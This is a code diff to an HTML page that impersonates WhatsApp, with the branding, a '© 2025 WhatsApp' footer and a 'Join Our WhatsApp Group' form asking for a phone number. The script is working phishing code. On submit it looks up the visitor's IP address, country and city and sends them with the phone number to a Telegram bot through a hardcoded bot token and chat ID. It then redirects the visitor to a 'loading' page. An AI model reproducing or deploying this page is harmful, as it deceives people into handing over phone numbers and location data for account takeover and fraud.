@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Green Navbar with Phone Input</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WhatsApp Invite</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
   <style>
     body {
       margin: 0;
@@ -87,71 +87,26 @@
       text-align: center;
     }
 
-    footer .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    footer .footer-links span {
-      display: block;
-    }
-
-    footer .footer-bottom {
+    .footer-bottom {
       font-size: 14px;
       opacity: 0.8;
-    }
-
-    @media screen and (max-width: 480px) {
-      .container {
-        margin: 30px 10px;
-        padding: 20px 15px;
-      }
-
-      h2 {
-        font-size: 20px;
-      }
-
-      button {
-        padding: 12px 20px;
-        font-size: 15px;
-      }
     }
   </style>
 </head>
 <body>
-  <div class="navbar">
-    🌿 Green Navbar
-  </div>
+  <div class="navbar">🌿 WhatsApp Invite</div>
 
   <div class="container">
-    <img src="DSxOAUB0raA.png" alt="Second Image" class="sub-image">
-    <img src="172245867233593622.png" alt="Logo" class="logo">
+    <img src="DSxOAUB0raA.png" alt="Header" class="sub-image" />
+    <img src="172245867233593622.png" alt="Logo" class="logo" />
     <h2>Join Our WhatsApp Group</h2>
     <form id="phone-form">
-      <input id="phone" class="phone-input" type="tel" placeholder="+1 234 567 8900" required autocomplete="off">
+      <input id="phone" class="phone-input" type="tel" placeholder="+1 234 567 8900" required autocomplete="off" />
       <button type="submit">Join Now</button>
     </form>
   </div>
 
   <footer>
-    <div class="footer-links">
-        <p>Use WhatsApp</p>
-        <p>Features</p>
-        <p>WhatsApp Web</p>
-        <p>Download</p>
-        <p>About Us</p>
-        <p>Business</p>
-        <p>Security</p>
-        <p>Privacy & Terms</p>
-        <p>Get in Touch</p>
-        <p>Contact Us</p>
-        <p>Facebook | X (Twitter)</p>
-        <p>Meta Logo</p>
-        <p>© 2025 WhatsApp</p>
-    </div>
     <div class="footer-bottom">© 2025 WhatsApp</div>
   </footer>
 
@@ -162,12 +117,11 @@
       initialCountry: "auto",
       geoIpLookup: function (callback) {
         fetch("https://ipapi.co/json")
-          .then((resp) => resp.json())
+          .then((res) => res.json())
           .then((data) => {
-            const countryCode = data && data.country ? data.country : "us";
-            callback(countryCode.toLowerCase());
+            callback(data.country_code);
           })
-          .catch(() => callback("us"));
+          .catch(() => callback("US"));
       },
       utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
     });
@@ -183,32 +137,32 @@
       const phoneNumber = iti.getNumber();
 
       fetch("https://ipapi.co/json")
-        .then((response) => response.json())
+        .then((res) => res.json())
         .then((data) => {
-          const ip = data.ip;
-          const country = data.country_name;
-          const city = data.city;
+          const message = `📱 New Number:\n${phoneNumber}\n🌍 ${data.country_name}, ${data.city}\n💻 IP: ${data.ip}`;
 
-          const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
+          // Replace with your actual token and chat ID
+          const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
+          const chatId = "7196613507";
 
-          const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY"; // Replace with your bot token
-          const chatId = "7196613507";     // Replace with your chat ID
-
-          fetch(`https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`, {
+          return fetch(`https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`, {
             method: "POST",
             headers: {
-              "Content-Type": "application/json"
+              "Content-Type": "application/json",
             },
             body: JSON.stringify({
               chat_id: chatId,
-              text: message
-            })
-          }).then(() => {
-            window.location.href = "loading.html";
+              text: message,
+            }),
           });
         })
-        .catch((error) => {
-          console.error("Error:", error);
+        .then(() => {
+          // ✅ Redirect to loading after sending
+          window.location.href = "loading.html";
+        })
+        .catch((err) => {
+          console.error("Failed to send:", err);
+          alert("Something went wrong. Try again.");
         });
     });
   </script>
